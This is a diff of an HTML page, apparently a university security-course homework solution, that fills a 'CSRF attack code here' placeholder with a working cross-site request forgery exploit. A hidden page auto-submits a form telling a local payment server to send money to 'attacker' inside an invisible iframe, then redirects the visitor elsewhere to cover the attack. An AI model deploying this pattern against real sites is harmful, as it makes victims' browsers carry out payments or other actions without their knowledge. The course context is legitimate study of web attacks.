@@ -1,6 +1,29 @@
 <!DOCTYPE html>
 <html>
+<body style="visibility: hidden">
 
-<!-- Insert CSRF attack code here -->
+<iframe id="iframe" name="iframe"></iframe>
+
+<p>
+<form action="http://localhost:8080/pay" method="post" target="iframe">
+    <div class="form-group">
+      <div class="form-label">To:</div>
+      <div class="form-input"><input name="recipient" type="text" value="attacker"></div>
+    </div>
+    <div class="form-group">
+      <div class="form-label">Amount:</div>
+      <div class="form-input"><input name="amount" type="number" value="10"></div>
+    </div>
+    <input class="form-button" type="submit" value="Pay">
+</form>
+</p>
+
+<script>
+  document.getElementById("iframe").onload = function(){window.location.replace("http://github.com/tomrist/cs5435-fall2019")}
+
+  document.forms[0].submit();
+</script>
+
+</body>
 
 </html>
